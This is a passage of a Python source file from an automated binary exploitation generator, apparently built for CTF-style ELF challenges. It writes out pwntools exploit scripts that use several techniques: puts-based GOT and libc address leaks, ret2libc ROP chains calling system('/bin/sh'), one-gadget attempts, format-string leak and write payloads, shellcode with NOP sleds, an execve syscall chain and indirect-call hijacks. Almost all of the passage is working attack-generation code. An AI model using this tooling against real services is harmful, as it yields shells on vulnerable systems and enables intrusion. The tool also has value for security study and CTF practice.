		filler_output_file.close()
	except:
		filler_ouput = ""

	if elf.arch == "amd64":
		os.remove("far-cry")

	try:
		os.remove("justifies")

	except:
		print("no filler output")

	return filler_ouput

def setup_dual_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, exploit_name):
	payload_parts = payload_parts_generator(elf, stack_vuln)

	got_addresses = get_got_addresses(elf_name)

	got_func0 = "puts"
	got_func1 = "__libc_start_main"

	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(elf_name)

		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append(gadget)
		rop_chain.append(got_addresses[got_func0])
		rop_chain.append(plt_funcs["puts"])

		rop_chain.append(gadget)
		rop_chain.append(got_addresses[got_func1])
		rop_chain.append(plt_funcs["puts"])


	elif elf.arch == "i386":
		rop_chain.append(plt_funcs["puts"])
		rop_chain.append(plt_funcs["puts"])

		rop_chain.append(got_addresses[got_func0])
		rop_chain.append(got_addresses[got_func1])

	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, exploit_name)

	return got_func0, got_func1

def setup_basic_puts_libc_infoleak(elf_name, elf, stack_vuln, plt_funcs, libc, filler_output, exploit_name):

	setup_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, exploit_name, True)


	filter_output(filler_output, exploit_name)

	if elf.arch == "amd64":
		exploit_write('leak = target.recvuntil(b"\\n").strip(b"\\n")', exploit_name)
		exploit_write('puts_address = u64(leak + b"\\x00"*(8-len(leak)))', exploit_name)
	elif elf.arch == "i386":
		exploit_write('leak = target.recv(4)', exploit_name)
		exploit_write('puts_address = u32(leak)', exploit_name)

	symbol = "puts"
	offset = get_symbol(libc, symbol)

	exploit_write('libc_base = puts_address - (%d)' % offset, exploit_name)
	exploit_write('print("libc base is: %s" % hex(libc_base))', exploit_name)
	if elf.arch == "amd64":
		exploit_write('bof_payload = sf.BufferOverflow(arch = 64)', exploit_name)
	else:
		exploit_write('bof_payload = sf.BufferOverflow(arch = 32)', exploit_name)		
	exploit_write('bof_payload.add_base("libc", libc_base)', exploit_name)

def filter_output(filler_output, exploit_name):
	if len(filler_output) > 0:
		for i in range(0, len(filler_output.split("\\n")) - 1):
			exploit_write("target.recvline()", exploit_name)
		finalOutput = filler_output.split("\\n")[-1]
		if len(finalOutput) > 0:
			exploit_write('target.recvuntil("%s")' % finalOutput, exploit_name)

def id_libcs(elf_name, elf, stack_vuln, plt_funcs, filler_output, ip_port = None):
	exploit_name = setup_id_exploit(elf_name, elf, ip_port)
	func0, func1 = setup_dual_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, exploit_name)
	filter_output(filler_output, exploit_name)

	if elf.arch == "amd64":
		exploit_write('leak = target.recvuntil(b"\\n").strip(b"\\n")', exploit_name)
		exploit_write('gotAddress0 = u64(leak + b"\\x00"*(8-len(leak)))', exploit_name)
		
		exploit_write('leak = target.recvuntil(b"\\n").strip(b"\\n")', exploit_name)
		exploit_write('gotAddress1 = u64(leak + b"\\x00"*(8-len(leak)))', exploit_name)

	elif elf.arch == "i386":
		exploit_write('leak = target.recv(4)', exploit_name)
		exploit_write('gotAddress0 = u32(leak)', exploit_name)	
		exploit_write('target.recvline()', exploit_name)
		exploit_write('leak = target.recv(4)', exploit_name)
		exploit_write('gotAddress1 = u32(leak)', exploit_name)	

	exploit_write('symbol0 = "%s"' % func0, exploit_name)
	exploit_write('symbol1 = "%s"' % func1, exploit_name)

	exploit_write('thenight.find_libc_version_automated("%s", gotAddress0, "%s", gotAddress1)' % (func0, func1), exploit_name)

	os.system("python3 afterlife.py")

	time.sleep(.5)

	output_file = open("TheNight-Out", "rb")
	libcs = []
	try:
		while True:
			libcs.append(pickle.load(output_file))
	except:
		output_file.close()

	retLibcs = []
	for libc in libcs:
		libc = "libc%s" % libc.split("libc")[1]
		retLibcs.append(libc)

	return retLibcs

def make_libc_solidified_exploits_directory(elf_name, ip_port):
	if os.path.exists(LIBC_EXPLOITS_DIRECTORY_NAME):
		shutil.rmtree(directory_name)

	os.mkdir(LIBC_EXPLOITS_DIRECTORY_NAME)

	if ip_port == None:
		shutil.copyfile(elf_name, "%s/%s" % (LIBC_EXPLOITS_DIRECTORY_NAME, elf_name))
		os.chmod("%s/%s" % (LIBC_EXPLOITS_DIRECTORY_NAME, elf_name), stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)

def enter_libc_directory(elf_name, libc):
	# Make The Directory
	directory_name = "libc-%s" % libc.split(".so")[0]
	os.mkdir(directory_name)

	# Copy the files inside
	shutil.copyfile(elf_name, "%s/%s" % (directory_name, elf_name))
	shutil.copyfile("%s%s" % (THE_NIGHT_LIBCS, libc), "%s/%s" % (directory_name, libc))

	# cd into the directory
	os.chdir(directory_name)

	# Mark the elf_name executable
	os.chmod("%s" % (elf_name), stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)

	# Run itl
	os.system("itl -b %s -l %s" % (elf_name, libc))


def enter_single_libc_directory(elf_name, libc, attack_type):
	# Make The Directory
	directory_name = "libc-exploit-dev-%s" % attack_type

	if os.path.exists(directory_name) == False:
		os.mkdir(directory_name)

	# Copy the files inside
	shutil.copyfile(elf_name, "%s/%s" % (directory_name, elf_name))
	shutil.copyfile("%s" % (libc), "%s/%s" % (directory_name, libc))

	# cd into the directory
	os.chdir(directory_name)

	# Mark the elf_name executable
	os.chmod("%s" % (elf_name), stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)

	# Run itl
	os.system("itl -b %s -l %s" % (elf_name, libc))

def exit_single_libc_directory():
	os.chdir("../")

def gen_exploits_for_libc(elf_name, elf, libc_name, stack_vuln, plt_funcs, filler_output, ip_port = None):
	# Setup the elf_name and libc to use
	enter_libc_directory(elf_name, libc_name)

	exploits = []

	i = 0
	exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2LibcId-%d" % i)
	i += 1

	libc = ELF(libc_name)

	setup_basic_puts_libc_infoleak(elf_name, elf, stack_vuln, plt_funcs, libc, filler_output, exploit_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)

	system = get_symbol(libc, "system")
	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(libc_name)
		gadget = get_gadget("pop rdi ; ret")		

		binsh = get_bin_sh(libc_name)

		rop_chain.append([gadget, "libc"])
		rop_chain.append([binsh, "libc"])
		rop_chain.append([system, "libc"])

	elif elf.arch == "i386":
		calling_function = stack_vuln.calling_function
		if (str(calling_function) == "main"):
			stack_vuln.overwriteable_vars[0] = (stack_vuln.overwriteable_vars[0] - 8)
			payload_parts = payload_parts_generator(elf, stack_vuln)

		binsh = get_bin_sh(libc_name)

		rop_chain.append([system, "libc"])
		rop_chain.append(b"0000")
		rop_chain.append([binsh, "libc"])

	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, exploit_name )

	write_crash_detection_libc(exploit_name)

	exploits.append(exploit_name)

	if elf.arch == "amd64":
		exploits = []
		oneShotGadgets = get_oneshot_gadgets(libc_name)
		for gadget in oneShotGadgets:
			exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2LibcId-%d" % i)
			i += 1

			setup_basic_puts_libc_infoleak(elf_name, elf, stack_vuln, plt_funcs, libc, filler_output, exploit_name)

			payload_parts = payload_parts_generator(elf, stack_vuln)

			payload_parts.set_ret([gadget, "libc"])

			payload_parts.construct_payload(elf, exploit_name)

			write_crash_detection_libc(exploit_name)

			exploits.append(exploit_name)

	libc_verify_exploit(exploits, libc_name, elf_name, ip_port)

	exit_single_libc_directory()


def check_libc_exploits(ip_port):
	os.chdir(LIBC_EXPLOITS_DIRECTORY_NAME)
	files = os.listdir(".")

	if ip_port == None:
		for file in files:
			if "chall-test" not in file:
				print("Exploit Successful: %s" % file)
				finalize_libc_exploit(file)
				sys.exit(0)		

	for file in files:
		if "chall-test" in file:
			continue
		output = os.popen("./%s" % file).read()
		if "Exploit Successful15935728!" in output:
			print("Exploit Successful: %s" % file)
			finalize_libc_exploit(file)
			sys.exit(0)


'''
+-----------------------------------------------------------+
|            Fmt String Helper Functions                    |
+-----------------------------------------------------------+
'''

def write_fmt_str_shellcode64(value, address, stack_offset, bytes_printed, alignment_bytes, shellcode, starting_offset, exploit_name, value_base = 0x0, address_base = 0x0):
	exploit_write("fs = sf.WriteFmtStr(", exploit_name)
	exploit_write("\t\tarch = 64,", exploit_name)
	exploit_write("\t\tvalue = %s," % hex(value * -1), exploit_name)
	exploit_write("\t\taddress = %s," % hex(address), exploit_name)
	exploit_write("\t\toffset = %s," % hex(stack_offset), exploit_name)
	exploit_write("\t\tprinted_bytes = %s," % hex(bytes_printed), exploit_name)
	exploit_write("\t\talignment_bytes = %s," % hex(alignment_bytes), exploit_name)
	exploit_write("\t\tvalue_base = %s," % value_base, exploit_name)
	exploit_write("\t\taddress_base = %s)\n" % address_base, exploit_name)

	exploit_write("payload = sf.BufferOverflow(arch=64, start=%d)" % starting_offset, exploit_name)
	exploit_write("payload.add_bytes(%d, fs.generate_fmt_str())" % starting_offset, exploit_name)
	exploit_write('payload.add_bytes(%d, b"%s")' % (value,shellcode), exploit_name)
	exploit_write("target.sendline(payload.generate_payload())", exploit_name)

def write_fmt_str_shellcode32(value, address, stack_offset, bytes_printed, alignment_bytes, shellcode, starting_offset, exploit_name, value_base = 0x0, address_base = 0x0):
	exploit_write("fs = sf.WriteFmtStr(", exploit_name)
	exploit_write("\t\tarch = 32,", exploit_name)
	exploit_write("\t\tvalue = %s," % hex(value * -1), exploit_name)
	exploit_write("\t\taddress = %s," % hex(address), exploit_name)
	exploit_write("\t\toffset = %s," % hex(stack_offset), exploit_name)
	exploit_write("\t\tprinted_bytes = %s," % hex(bytes_printed), exploit_name)
	exploit_write("\t\talignment_bytes = %s," % hex(alignment_bytes), exploit_name)
	exploit_write("\t\tvalue_base = %s," % value_base, exploit_name)
	exploit_write("\t\taddress_base = %s)\n" % address_base, exploit_name)

	exploit_write("payload = sf.BufferOverflow(arch=32, start=%d)" % starting_offset, exploit_name)
	exploit_write("payload.add_bytes(%d, fs.generate_fmt_str())" % starting_offset, exploit_name)
	exploit_write('payload.add_bytes(%d, b"%s")' % (value,shellcode), exploit_name)
	exploit_write("target.sendline(payload.generate_payload())", exploit_name)

def get_fmt_string_offset(fmt_string_vuln, elf_name, elf):
	address = fmt_string_vuln.address

	if elf.arch == "i386":
		values = command_dynamic_analyzer("printfOffset32:%s" % hex(address), elf_name)
		stack_offset = values[0]
		bytes_offset = values[1]
		position_offset = values[2]
		if position_offset == 4:
			position_offset = 0
		else:
			stack_offset += 1


	elif elf.arch == "amd64":
		values = command_dynamic_analyzer("printfOffset64:%s" % hex(address), elf_name)
		stack_offset = values[0]
		bytes_offset = values[1]
		position_offset = values[2]
		if position_offset == 8:
			position_offset = 0
		else:
			stack_offset += 1

	return stack_offset, bytes_offset, position_offset

def get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf):
	address = fmt_string_vuln.address

	if elf.arch == "i386":

		values = command_dynamic_analyzer("printfOffset32Pie:%s" % hex(address), elf_name)
		stack_offset = values[0]
		bytes_offset = values[1]
		position_offset = values[2]
		if position_offset == 4:
			position_offset = 0
		else:
			stack_offset += 1

	elif elf.arch == "amd64":

		values = command_dynamic_analyzer("printfOffset64Pie:%s" % hex(address), elf_name)
		stack_offset = values[0]
		bytes_offset = values[1]
		position_offset = values[2]
		if position_offset == 8:
			position_offset = 0
		else:
			stack_offset += 1
	return stack_offset, bytes_offset, position_offset

def fs_exploit_verifictation(exploit_name):
	exploit = open(exploit_name, "a")
	exploit.write("\n# Exploit Verification starts here 15935728\n\n")

	exploit.write("def handler(signum, frame):\n")
	exploit.write('\traise Exception("Timed out")\n\n')

	exploit.write("signal.signal(signal.SIGALRM, handler)\n")
	exploit.write("signal.alarm(2)\n\n")

	exploit.write("try:\n")
	exploit.write("\twhile True:\n")
	exploit.write('\t\ttarget.recvall(timeout=2)\n')
	exploit.write('except Exception:\n')
	exploit.write('\tprint("Exploit timed out")\n')
	exploit.close()

def write_fmt_str64(value, address, stack_offset, bytes_printed, alignment_bytes, exploit_name, value_base = 0x0, address_base = 0x0):
	exploit_write("fs = sf.WriteFmtStr(", exploit_name)
	exploit_write("\t\tarch = 64,", exploit_name)
	exploit_write("\t\tvalue = %s," % hex(value), exploit_name)
	exploit_write("\t\taddress = %s," % hex(address), exploit_name)
	exploit_write("\t\toffset = %s," % hex(stack_offset), exploit_name)
	exploit_write("\t\tprinted_bytes = %s," % hex(bytes_printed), exploit_name)
	exploit_write("\t\talignment_bytes = %s," % hex(alignment_bytes), exploit_name)
	exploit_write("\t\tvalue_base = %s," % value_base, exploit_name)
	exploit_write("\t\taddress_base = %s)" % address_base, exploit_name)

	exploit_write("payload = fs.generate_fmt_str()", exploit_name)
	exploit_write("target.sendline(payload)", exploit_name)

def write_fmt_str86(value, address, stack_offset, bytes_printed, alignment_bytes, exploit_name, value_base = 0x0, address_base = 0x0):
	exploit_write("fs = sf.WriteFmtStr(", exploit_name)
	exploit_write("\t\tarch = 32,", exploit_name)
	exploit_write("\t\tvalue = %s," % hex(value), exploit_name)
	exploit_write("\t\taddress = %s," % hex(address), exploit_name)
	exploit_write("\t\toffset = %s," % hex(stack_offset), exploit_name)
	exploit_write("\t\tprinted_bytes = %s," % hex(bytes_printed), exploit_name)
	exploit_write("\t\talignment_bytes = %s," % hex(alignment_bytes), exploit_name)
	exploit_write("\t\tvalue_base = %s," % value_base, exploit_name)
	exploit_write("\t\taddress_base = %s)" % address_base, exploit_name)

	exploit_write("payload = fs.generate_fmt_str()", exploit_name)
	exploit_write("target.sendline(payload)", exploit_name)


def setup_fs_pieinfoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name):
	address = fmt_string_vuln.address

	output = command_dynamic_analyzer("printPieOffset:%s" % hex(address), elf_name)
	if output is None:
		return False

	pie_fs_offset = output[0]
	offset_to_pie_base = output[1]

	before_string = "xxxxxxx"
	after_string  = "yyyyyyy"

	exploit_write('leakPayload = b""', exploit_name)
	exploit_write('leakPayload += b"%s"' % before_string, exploit_name)
	if elf.arch == "i386":
		exploit_write('leakPayload += b"%{fsOffset}$x"'.format(fsOffset = pie_fs_offset), exploit_name)

	elif elf.arch == "amd64":
		exploit_write('leakPayload += b"%{fsOffset}$lx"'.format(fsOffset = pie_fs_offset), exploit_name)
	exploit_write('leakPayload += b"%s"' % after_string, exploit_name)

	exploit_write('target.sendline(leakPayload)', exploit_name)

	exploit_write('leak = target.recvuntil(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.strip(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.split(b"%s")[1]' % before_string, exploit_name)
	exploit_write('leak = int(leak, 0x10)\n', exploit_name)

	exploit_write('pie_base = leak - %s' % hex(offset_to_pie_base), exploit_name)
	exploit_write('print("PieBase is: %s" % hex(pie_base))', exploit_name)
	return True

def setup_stack_fs_infoleak(infoleak_vuln, exploit_name):
    # Find the string to parse it out
	fmt_index = infoleak_vuln.fmt_index
	str0, str1 = parse_infoleak_fmt_string(infoleak_vuln.string, fmt_index, exploit_name)


	if len(str0) > 0 and len(str1) > 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvuntil(b"%s").strip(b"%s"), 16)' % (str1, str1), exploit_name)

	if len(str0) > 0 and len(str1) == 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvline().strip(b"\\n"), 16)', exploit_name)

	if (infoleak_vuln.function == infoleak_vuln.calling_function == infoleak_vuln.address == None):
		printf_infoleak = infoleak_vuln.offset
	else:
		printf_infoleak = infoleak_vuln.offset
	exploit_write('ret_address = leak + (%d)' % printf_infoleak, exploit_name)

def setup_fs_libc_infoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name):
	address = fmt_string_vuln.address
	output = command_dynamic_analyzer("printLibcOffset:%s" % hex(address), elf_name)
	if output is None:
		return False

	libc_fs_offset = output[0]
	offset_to_libc_base = output[1]

	before_string = "xxxxxxx"
	after_string  = "yyyyyyy"

	exploit_write('leakPayload = b""', exploit_name)
	exploit_write('leakPayload += b"%s"' % before_string, exploit_name)
	if elf.arch == "i386":
		exploit_write('leakPayload += b"%{fsOffset}$x"'.format(fsOffset = libc_fs_offset), exploit_name)

	elif elf.arch == "amd64":
		exploit_write('leakPayload += b"%{fsOffset}$lx"'.format(fsOffset = libc_fs_offset), exploit_name)
	exploit_write('leakPayload += b"%s"' % after_string, exploit_name)

	exploit_write('target.sendline(leakPayload)', exploit_name)

	exploit_write('leak = target.recvuntil(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.strip(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.split(b"%s")[1]' % before_string, exploit_name)
	exploit_write('leak = int(leak, 0x10)\n', exploit_name)

	exploit_write('libc_base = leak - %s' % hex(offset_to_libc_base), exploit_name)
	exploit_write('print("libcBase is: %s" % hex(libc_base))', exploit_name)
	return True

def setup_fs_stack_infoleak_from_stack(fmt_string_vuln, elf_name, elf, shellcode, shellcode_len, exploit_name):
	address = fmt_string_vuln.address

	output = command_dynamic_analyzer("printStackOffset:%s" % hex(address), elf_name)
	if output is None:
		return False

	stack_fs_offset = output[0]
	offset_to_ret = output[1]

	before_string = "xxxxxxx"
	after_string  = "yyyyyyy"

	inp = fmt_string_vuln.inp_method
	shellcode, shellcode_len = get_shellcode(elf, inp)

	if elf.arch == "i386":
		exploit_write('leakPayload = b""', exploit_name)
		exploit_write('leakPayload += b"%s"' % shellcode, exploit_name)
		exploit_write('leakPayload += b"%s"' % before_string, exploit_name)
		exploit_write('leakPayload += b"%{fsOffset}$x"'.format(fsOffset = stack_fs_offset), exploit_name)
		exploit_write('leakPayload += b"%s"' % after_string, exploit_name)

	elif elf.arch == "amd64":
		leak_string = "%{fsOffset}$lx".format(fsOffset = stack_fs_offset)
		exploit_write('leakPayload = b""', exploit_name)
		exploit_write('leakPayload += b"%s"' % before_string, exploit_name)
		exploit_write('leakPayload += b"%s"' % leak_string, exploit_name)
		exploit_write('leakPayload += b"%s"' % after_string, exploit_name)
		exploit_write('leakPayload += b"%s"' % shellcode, exploit_name)

	exploit_write('target.sendline(leakPayload)', exploit_name)

	exploit_write('leak = target.recvuntil(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.strip(b"%s")' % (after_string), exploit_name)
	exploit_write('leak = leak.split(b"%s")[1]' % before_string, exploit_name)
	exploit_write('leak = int(leak, 0x10)\n', exploit_name)

	inp_offset = inp.offset
	exploit_write('ret_address = leak + %s' % hex(offset_to_ret), exploit_name)
	if elf.arch == "i386":
		exploit_write('input_address = ret_address - %s' % hex(inp_offset), exploit_name)
	elif elf.arch == "amd64":
		x64_inp_offset = len(before_string) + len(after_string) + len(leak_string)
		exploit_write('input_address = ret_address - %s' % hex(inp_offset - x64_inp_offset), exploit_name)		
	exploit_write('print("Return Address is: %s" % hex(ret_address))', exploit_name)
	exploit_write('print("Input  Address is: %s" % hex(input_address))', exploit_name)


def parse_infoleak_fmt_string(string, index, exploit_name):
	indexes = [i for i, x in enumerate(string) if x == "%"]
	index0 = indexes[index]
	index1 = string.find("p", index0)
	str0 = string[:index0].strip("\n")
	str1 = string[index1 + 1:].strip("\n")
	if "%" in str0:
		str0_parts = str0.split("%")
		exploit_write('target.recvuntil("%s")' % str0_parts[0], exploit_name)
		str0 = str0_parts[-1]
		str0 = str0[1:]
	if "%" in str1:
		str1_parts = str1.split("%")
		str1 = str1_parts[0]
	return str0, str1


'''
+-----------------------------------------------------------+
|            Attack Exploitation Generation                 |
+-----------------------------------------------------------+
'''
def BofVar(args):
	# Filter out the args
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]

	# Make the payload
	payload_parts = payload_parts_generator(elf, stack_vuln)

	# Construct exploit based on input type
	inp_type = stack_vuln.inp_type

	# Typical stdin input
	if inp_type == "stdin":
		exploit_name = setup_exploit(elf_name, elf, "BofVar")
		payload_parts.construct_payload(elf, exploit_name)

	# argv input needs to be given in a specific way
	else:
		exploit_name = payload_parts.construct_payload_argv(elf, elf_name, "BofVar")

		verify_argv_exploit(exploit_name)
		return []

	write_crash_detection(exploit_name)
	return [exploit_name]

def BofFunc(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]

	exploit_name = setup_exploit(elf_name, elf, "BofFunc")

	payload_parts = payload_parts_generator(elf, stack_vuln)

	payload_parts.set_ret(functions[0])

	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def BofFuncWInfoleak(args):

	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]
	infoleak_vulns = args[4]

	exploit_name = setup_exploit(elf_name, elf, "BofFuncWInfoleak")

	infoleak_vuln = infoleak_vulns[0]
	setup_pie_infoleak(infoleak_vuln, exploit_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)
	payload_parts.set_ret([functions[0], "pie"])

	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def BofSystem(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]

	elf = ELF(elf_name)
	arch = elf.arch

	exploit_name = setup_exploit(elf_name, elf, "BofSystem")

	system = get_symbol(elf, "system")

	binsh  = get_bin_sh(elf_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)


	rop_chain = []
	if arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append(gadget)
		rop_chain.append(binsh)
		rop_chain.append(system)

	elif arch == "i386":
		rop_chain.append(system)
		rop_chain.append(b"0000")
		rop_chain.append(binsh)		

	payload_parts.set_rop_chain(rop_chain)

	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def BofSystemWInfoleak(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	infoleaksPie = args[3]

	exploit_name = setup_exploit(elf_name, elf, "BofSystemWInfoleak")

	infoleak_vuln = infoleaksPie[0]
	setup_pie_infoleak(infoleak_vuln, exploit_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)

	system = get_plt_system_address(elf_name)
	binsh  = get_bin_sh(elf_name)

	arch = elf.arch

	rop_chain = []
	if arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")
		rop_chain.append([gadget, "pie"])
		rop_chain.append([binsh, "pie"])
		rop_chain.append([system, "pie"])

	elif arch == "i386":
		rop_chain.append([system, "pie"])
		rop_chain.append(b"0000")
		rop_chain.append([binsh, "pie"])

	payload_parts.set_rop_chain(rop_chain)

	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def BofFuncArgv(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]

	payload_parts = payload_parts_generator(elf, stack_vuln)

	payload_parts.set_ret(functions[0])

	exploit_name = payload_parts.construct_payload_argv(elf, elf_name, "BofFuncArgv")
	verify_argv_exploit(exploit_name)

	return None

def BofShellcode(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	infoleak_vuln = args[3]

	arch = elf.arch

	exploit_name = setup_exploit(elf_name, elf, "BofShellcode")
	ptrSize = get_arch_int_size(elf)

	# Setup the stack infoleak
	setup_stack_shellcode_infoleak(infoleak_vuln, exploit_name)

	# Get the shellcode we will use
	shellcode, shellcode_len = get_shellcode(elf, stack_vuln)

	# Setup the payload
	payload_parts = placeShellcode(elf, stack_vuln, shellcode, shellcode_len)

	# Construct the payload
	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def IndrCall(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	win_funcs = args[3]
	
	exploit_name = setup_exploit(elf_name, elf, "IndrCall")

	win_func = win_funcs[0]

	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 

	ptr = indirect_ptrs[0]

	stack_vuln = prep_indirect_call(elf, stack_vuln, win_func, ptr)

	payload_parts = payload_parts_generator(elf, stack_vuln, False)

	payload_parts.construct_payload(elf, exploit_name)

	write_crash_detection(exploit_name)

	return [exploit_name]

def IndrCallPie(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	win_funcs = args[3]
	pie_infoleaks = args[4]

	exploit_name = setup_exploit(elf_name, elf, "IndrCallPie")
	#prep_stack_vuln(stack_vuln)

	infoleak_vuln = pie_infoleaks[0]
	setup_pie_infoleak(infoleak_vuln, exploit_name)

	win_func = win_funcs[0]

	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 

	ptr = indirect_ptrs[0]

	stack_vuln = prep_indirect_call(elf, stack_vuln, win_func, ptr, "pie")

	payload_parts = payload_parts_generator(elf, stack_vuln, False)

	payload_parts.construct_payload(elf, exploit_name)

	write_crash_detection(exploit_name)

	return [exploit_name]

def IndrCallLibc(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	libc_infoleaks = args[3]
	libc_name = args[4]
	libc = args[5]

	enter_single_libc_directory(elf_name, libc_name, "IndrCallLibc")

	infoleak_vuln = libc_infoleaks[0]

	exploits = []
	one_shot_gadgets = get_oneshot_gadgets(libc_name)
	i = 0
	for one_shot in one_shot_gadgets:
		exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "IndrCallLibc-%d" % i)
		i += 1

		prep_stack_vuln(stack_vuln)

		setup_libc_infoleak(infoleak_vuln, libc, exploit_name)
		indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 

		ptr = indirect_ptrs[0]

		stack_vuln = prep_indirect_call(elf, stack_vuln, one_shot, ptr, "libc")

		payload_parts = payload_parts_generator(elf, stack_vuln, False)

		payload_parts.construct_payload(elf, exploit_name)

		write_crash_detection_libc(exploit_name)

		exploits.append(exploit_name)

	successful_exploit = test_libc_exploits(exploits)

	exit_single_libc_directory()

	return []
def IndrCallShellcode(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	stack_infoleaks = args[3]

	# Setup the elf and the exploi
	exploit_name = setup_exploit(elf_name, elf, "IndrCallShellcode")

	# Setup the stack infoleak
	infoleak_vuln = stack_infoleaks[0]
	setup_stack_shellcode_infoleak(infoleak_vuln, exploit_name)

	# Get the indirect ptrs we will be using
	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 
	ptr = indirect_ptrs[0]

	# Get the shellcode we will use
	shellcode, shellcode_len = get_shellcode(elf, stack_vuln)

	# Setup the payload, and place the shellcode
	payload_parts = place_shellcode_indr_call(elf, stack_vuln, shellcode, shellcode_len)

	if payload_parts == None:
		return []

	# Construct the payload
	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def CallInput(args):
	elf_name = args[0]
	elf = args[1]
	call_input_vuln = args[2]

	exploit_name = setup_exploit(elf_name, elf, "CallInput")

	# Fill up our input with nops, up to where we know our input gets executed
	offset = call_input_vuln.offset


	shellcode, shellcode_len = get_shellcode(elf, call_input_vuln)

	payload_parts = PayloadParts()
	payload_parts.start = offset	

	parts = []
	shellcode_part = Part()
	shellcode_part.type = bytes
	shellcode_part.region = None
	shellcode_part.offset = 0
	shellcode_part.value = shellcode
	parts.append(shellcode_part)
	payload_parts.parts = parts

	payload_parts.set_default_byte(0x90)

	# Generate the exploit
	payload_parts.construct_payload(elf, exploit_name)
	write_crash_detection(exploit_name)

	return [exploit_name]

def BofStatic(args):
	#return []
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]

	#elf = ELF(elf_name)
	exploit_name = setup_exploit(elf_name, elf, "BofStatic", "static")

	payload_parts = payload_parts_generator(elf, stack_vuln)

	grab_gadgets(elf_name)

	offset = stack_vuln.overwriteable_vars[0]

	rwAddress = command_dynamic_analyzer("get_pie_rw", elf_name)

	rop_chain = prep_rop_write_binsh(rwAddress, elf)

	if elf.arch == "amd64":

		popRdi = get_gadget("pop rdi ; ret")	
		popRax = get_gadget("pop rax ; ret")		
		popRsi = get_gadget("pop rsi ; ret")	
		popRdx = get_gadget("pop rdx ; ret")	

		syscall = get_gadget("syscall")

		rop_chain.append(popRax)
		rop_chain.append(0x3b)

		rop_chain.append(popRdi)
		rop_chain.append(rwAddress)

		rop_chain.append(popRsi)
		rop_chain.append(0x0)

		rop_chain.append(popRdx)
		rop_chain.append(0x0)

		rop_chain.append(syscall)

	elif elf.arch == "i386":
		print("Attack Not Supported yet for x86")
		return []

	payload_parts.set_rop_chain(rop_chain)

	payload_parts.construct_payload(elf, exploit_name)

	write_crash_detection(exploit_name)
	return [exploit_name]

def Ret2Libc(args):
	elf_name = args[0]
	elf = args[1]
	libc_name   = args[2]
	libc = args[3]
	stack_vuln = args[4]
	infoleaks = args[5]

	enter_single_libc_directory(elf_name, libc_name, "Ret2Libc")


	infoleak_vuln = infoleaks[0]

	exploits = []

	i = 0
	exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2Libc-%d" % i)
	i += 1

	setup_libc_infoleak(infoleak_vuln, libc, exploit_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)


	system = get_symbol(libc, "system")
	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(libc_name)
		gadget = get_gadget("pop rdi ; ret")		
		binsh = get_bin_sh(libc_name)

		rop_chain.append([gadget, "libc"])
		rop_chain.append([binsh, "libc"])
		rop_chain.append([system, "libc"])

	elif elf.arch == "i386":
		binsh = get_bin_sh(libc_name)

		rop_chain.append([system, "libc"])
		rop_chain.append(b"0000")
		rop_chain.append([binsh, "libc"])

	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, exploit_name)

